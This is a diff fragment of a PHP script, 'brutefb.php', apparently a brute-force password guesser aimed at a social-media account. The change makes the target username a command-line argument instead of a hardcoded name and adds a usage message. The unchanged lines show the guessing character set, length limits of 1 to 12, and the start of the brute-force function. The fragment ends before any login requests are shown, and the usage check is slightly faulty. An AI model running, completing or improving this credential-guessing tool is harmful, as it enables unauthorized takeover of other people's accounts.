@@ -3,12 +3,16 @@
 global $wrong;
 global $startpagina;
 $time = microtime() * 100000;
-$username = "kenkensquidkuddlephish";
+$username = $_SERVER["argv"][1];;
 echo "https://twitter.com/LizardL4nds";
 $Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
 $c_len = strlen($Pass); 
 $min = 1;
 $max = 12;
+if ($_SERVER["argc"] < 1) {
+  print "Usage: brutefb.php <username>\n";
+  exit;
+}
 function bruteForce($min, $max, $Pass)
 {
 while(True)
